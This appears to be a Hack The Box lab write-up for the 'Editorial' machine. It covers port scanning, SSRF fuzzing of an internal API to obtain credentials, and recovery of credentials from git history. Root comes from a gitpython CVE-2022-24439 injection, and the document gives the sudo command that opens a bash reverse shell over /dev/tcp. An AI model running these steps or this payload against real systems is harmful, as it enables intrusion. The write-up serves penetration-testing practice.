+++
title = "HTB - Editorial"
date = 2024-11-10
+++

### Scan
```
┌──(root㉿kali)-[/home/li0t/Desktop/HTB/Editorial]
└─# nmap -sVC -p- --open 10.10.11.20
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-05 09:35 EDT
Nmap scan report for editorial.htb (10.10.11.20)
Host is up (0.14s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Editorial Tiempo Arriba
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.83 seconds
```

### Enumeration
Website with an ask for book cover URL!
Check POC with python instance
We can monitor response with `burp`. Seemingly get endpoints as response. 
Copy the request for the cover upload and save it to `ssrf.req`
Check to see which ports may be listening, use `ffuf`:
`ffuf -request ssrf.req -request-proto http -w <(seq 1 65535) -fs 61` (Filtered by size)
We see 5000 checks out

### Initial Access
When we inspect in `burp`, we find an endpoint. QUICKLY using curl to check what the page has to offer:
`curl http://editorial.htb/static/uploads/6ab80140-4189-4a29-9883-2fb99f93619e | jq .` (`jq .` formats the JSON)
Navigating back to our `burp` window, when we alter our request to account for the `api/../authors` message:
`http://127.0.0.1:5000/api/..`
We get another endpoint. `curl` and format the same way:
`curl http://editorial.htb/static/uploads/150efc01-aaa0-4220-8284-0a44aabbfd81 | jq .`
We get credentials here!
`dev:dev080217_devAPI!@`
User:`7b5250a6a67deb535a1293310e3412a0`

### Privilege Escalation
Hidden `.git` folder. Also things to explore in `/var/www` and `/opt` folder.
Git syntax is interesting. Note in writeup! `git log -Gprod` will search all commits for anything related to `prod`, which is another user we can try to migrate to.
We can see a `change(api)` commit, which looks interesting.
`git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae` will give us credentials to `prod`
`prod:080217_Producti0n_2023!@`
`sudo -l` shows us that we can run a clone production script in the internal apps directory.
Viewing the script, we can infer that it's using `gitpython` in a vulnerable configuration, as we are able to manipulate the URL input to gain RCE. CVE-2022-24439
Read through POC, and tailor exploit for a shell. Note the use of `%` as a delimiter:
`sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c bash% -c% 'bash% -i% >&% /dev/tcp/10.10.14.10/9001% 0>&1'"`
Root:`df95efe33d3f0ba4b7a1ab0535e6d251`


